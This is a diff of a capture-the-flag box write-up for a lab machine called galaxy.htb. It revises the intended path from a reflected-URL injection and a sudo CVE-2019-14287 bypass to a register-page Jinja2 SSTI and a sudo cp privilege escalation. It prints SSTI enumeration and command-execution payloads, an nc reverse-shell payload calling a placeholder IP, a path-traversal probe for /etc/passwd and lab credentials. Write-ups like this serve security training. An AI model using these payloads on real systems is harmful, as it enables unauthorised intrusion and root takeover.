@@ -13,14 +13,14 @@ Passwords:
 | User  | Password                            |
 | ----- | ----------------------------------- |
 | web | Ab401c |
-| root  | 1roots |
+| root  | root8618 |
 
 ### Key Processes
 
 1) SSH server on 22 port
 2) Apache2 server on 80 port which is restricted page vulnerable to SSTI
-3) After enumerating subclasses in SSTI players need to find number of Popen subclass
-4) For root privilege escalation I set CVE-2019-14287 it is from real world and I believe it suits to box story
+3) Register page username vulnerable to SSTI which happened in real world. This box inspired from https://hackerone.com/reports/125980
+4) For root privilege I allowed /usr/bin/cp which players need critical thinking
 5) There is other user besides `web` and `root` (john,mathew,lily) and this is dummy user which has no password. I set them for box story and player needs to critical thinking to get shell after finding out CVE-2019-14287
 
 ### Automation / Crons
@@ -60,47 +60,34 @@ echo "192.168.2.110       galaxy.htb" | sudo tee -a /etc/hosts
 Website looks like blog about cosmos and it is in beta version
 <br>
 <br>
-![image](https://github.com/user-attachments/assets/402a2623-84b0-4d82-97a7-1fbe5681ee21)
+![image](https://github.com/user-attachments/assets/139af962-e96d-4f4b-bb40-642cbb41b017)
 
-Let's enumerate directories and subdirectories using ffuf tool:<br>
-```
-ffuf -u http://galaxy.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
-```
+Enumerating subdomains and directories leads to nothing, let's register for discount! from /register directory
+![image](https://github.com/user-attachments/assets/098e8733-963f-49a8-8a8f-4c62672cc313)
+
+After registering we got the message and our username displayed in screen, since we do not have other attack vector let's try to find vulnerability from register page
 <br>
-We find some directories one of them /developers worth to pay attention<br>
+After a long research we can find there is SSTI vulnerabilties!<br>
+To exploit register with username: `user{{7+7}}`
+![image](https://github.com/user-attachments/assets/2f0e3b44-2e52-4330-9346-6977ab12cbfd)
 
-![image](https://github.com/user-attachments/assets/0f004ee2-4c74-499e-9abd-0e563c7fc92c)
-
-Searching other subdirectories we didn't find anything usefull<br>
-
-Let's try file inclusion with `http://galaxy.htb/developers/../../../etc/passwd` payload<br>
-![image](https://github.com/user-attachments/assets/41a65f0e-d568-4238-9040-fcdf0605a18f)
-<br>
-There is no directory traversal or file inclusion vulnerability, but interesting thing whatever we write to url it get reflected in web page:<br>
-![image](https://github.com/user-attachments/assets/67c68efa-f06b-48af-bf00-cbc3bbbf3b8e)<br>
-
-After injecting:
-````
-http://galaxy.htb/developers{{7+7}}
-````
-We can confirm there is SSTI vulnerability
-![image](https://github.com/user-attachments/assets/a1acf1be-c195-44e9-9ce4-dae252c2c3cb)
 
 We need to know what template used, for that we use this formula:
 ![image](https://github.com/user-attachments/assets/14e9e059-81f0-45e6-b9bc-596ef8774d92)
 <br>
 Payload: `{{7*'7'}}`<br>
-![image](https://github.com/user-attachments/assets/04e4f93b-c880-48a3-9114-ecdbbb3483cc)
+![image](https://github.com/user-attachments/assets/516558a4-bc09-473b-8984-ad5c9be9525d)
+
 
 # Foothold
 
 ## Enumeration
 
-After searching from [blogs](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) and [PayloadAllThethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md?ref=sec.stealthcopter.com) we need to find `Popen` class for rce<br>
+We can confirm this is SSTI jinja2 vulnerability. After searching from [blogs](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) and [PayloadAllThethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md?ref=sec.stealthcopter.com) we need to find `Popen` class for rce<br>
 
 1) First we need to find all classes<br>
 Payload: `{{''.__class__.mro()[1].__subclasses__()}}`
-![image](https://github.com/user-attachments/assets/13d038bf-dbeb-44c0-8ff9-b575a2854b30)
+![image](https://github.com/user-attachments/assets/a05c7c6e-0ba6-477f-80b3-156d00e34df4)
 <br>
 We have hundreds of classes including `Popen` which we will use for command execution
 
@@ -108,47 +95,27 @@ We have hundreds of classes including `Popen` which we will use for command exec
 ![image](https://github.com/user-attachments/assets/bab7a081-9157-44d8-8411-e5240b4b7da1)
 
 After using `set number` command inside `vi` we will search `Popen`:<br>
-`/Popen`
-![image](https://github.com/user-attachments/assets/01372a62-a9e4-4a53-908f-6b521672c66a)
-We can see it is in number 259, but in programming language number starts from `0` so it should be 258.
+![Screenshot From 2025-03-01 14-04-30](https://github.com/user-attachments/assets/57e1a190-003f-42d1-a14d-b9f812f0e159)
+
+We can see it is in number 522, let's confirm it<br>
 <br>
+To confirm we use this payload: `{{''.__class__.mro()[1].__subclasses__()[522]}}`
 <br>
-To confirm we use this payload: `{{''.__class__.mro()[1].__subclasses__()[258]}}`
-<br>
-![image](https://github.com/user-attachments/assets/221e32ef-e141-406f-a02e-fd4a06b653de)
+![image](https://github.com/user-attachments/assets/3ed0b098-5c14-44e9-b34b-69a269a5729b)
+
 
 Next thing we need to use that process to gain command execution.
-Payload: `{{''.__class__.mro()[1].__subclasses__()[258]('id')}}`
-![image](https://github.com/user-attachments/assets/dfbcb7af-07d5-4905-bf43-61ad0b870f7f)
-Instead we get this error, let's try understand what is happening
-<br>
-We can use python in terminal to simulate similar situation:
-![image](https://github.com/user-attachments/assets/b182b2fe-ae1c-4523-8f70-6fbb7c44a9e8)
-In terminal we can execute command, but we still get `<Popen: returncode: None args: 'id'>` message and it freezes<br>
-Problem is `Popen` needs `.communicate()` and `stdout=-1` commands to get proper output. Read [this](https://forums.linuxmint.com/viewtopic.php?t=356930) documentation
-for more
-<br>
-Final payload:
-````
-{{''.__class__.mro()[1].__subclasses__()[258]('id',stdout=-1).communicate()}}
-````
-![image](https://github.com/user-attachments/assets/83cc0bef-8161-458e-9b05-81a2361238cb)
+Payload: `{{''.__class__.mro()[1].__subclasses__()[522]('id',shell=True,stdout=-1).communicate()}}`
+![image](https://github.com/user-attachments/assets/240c1cf0-f115-48d6-a940-1d3ba18c4a94)
 
-Now we got response!
-
-## Important
-subprocess.Popen and shell works differently. In Popen class you can't just type multiple commands like: "uname -a" or "cat /etc/passwd"
-<br>
-You need `shell=True` or you need to type independently like: `(['cat','/etc/passwd'])`
-![image](https://github.com/user-attachments/assets/8b433d41-c7c7-4525-8b15-eb4aae4bad48)
+We got a response!
 
 Lastly to get shell we will use this payload:
 ````
-{{''.__class__.mro()[1].__subclasses__()[258](['nc','YOUR_IP','YOUR_PORT','-e','/bin/bash'],stdout=-1).communicate()}}
+{{''.__class__.mro()[1].__subclasses__()[522](['nc IP YOUR_PORT -e /bin/bash'],stdout=-1).communicate()}}
 ````
-Don't forget to set netcat listener!
-
-![image](https://github.com/user-attachments/assets/dec24d30-6acd-4314-b8fb-8aa18547f04d)
+Don't forget to set netcat listener!<br>
+![image](https://github.com/user-attachments/assets/bacd717c-624b-4d98-a2b5-dde2f0913929)
 
 We got shell. Let's use ssh to get better shell<br>
 We copy our public key to /home/web/.ssh/authorized_keys:
@@ -179,33 +146,17 @@ Available codes:
 /home/john/devs/stars.js
 ````
 According to message we can copy everything from all /home/*/devs directory, we can confirm it by sudo rules:
-![image](https://github.com/user-attachments/assets/0fbcccbc-5c5b-4f79-91a3-334bb8144862)
-<br>So conlusion is we can copy anything from all devs directory of each user.<br>
-Unfortunately we can not do it as root because of `(ALL, !root)` 
-Searching other file and permission leads to nothing, after a long search we can find `sudo` uses outdated version which is vulnerable to CVE-2019-14287.
-````
-$ sudo --version
-Sudo version 1.8.27
-Sudoers policy plugin version 1.8.27
-Sudoers file grammar version 46
-Sudoers I/O plugin version 1.8.27
-````
-According to this [exploit](https://www.exploit-db.com/exploits/47502) we can bypass `!root`  by using `-u#-1` id as a result vulnerable sudo reads it as `0` which is root user
+![image](https://github.com/user-attachments/assets/12bd5b31-be6d-478a-ba27-91799c943cf2)
 <br>
-So what we have so far:<br>
-We can bypass `!root` restriction<br>
-We only can use `cp` from `/home/*/devs` to anywhere
-<br>
-<br>
-We can copy pubic key of `web` user to the   `/root/.ssh/authorized_keys` locaton as a result we can use ssh without password<br>
+To get root user, we can copy pubic key of `web` user to the   `/root/.ssh/authorized_keys` locaton as a result we can use ssh without password<br>
 Let's first copy our public key to the `devs` directory:
 ````
 cp /home/web/.ssh/id_rsa.pub /home/web/devs/key
 ````
-Then we will copy that public key from  `devs` directory to the `/root/.ssh/authorized_key`:
+Then we will copy that public key from  `devs` directory to the `/root/.ssh/authorized_key` using root:
 ````
-$ sudo -u#-1 cp /home/web/devs/key /root/.ssh/authorized_keys 
-$ ssh -i /home/web/.ssh/id_rsa root@192.168.0.110
+$ sudo /usr/bin/cp /home/web/devs/key /root/.ssh/authorized_keys 
+$ ssh -i /home/web/.ssh/id_rsa root@192.168.0.107
 Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
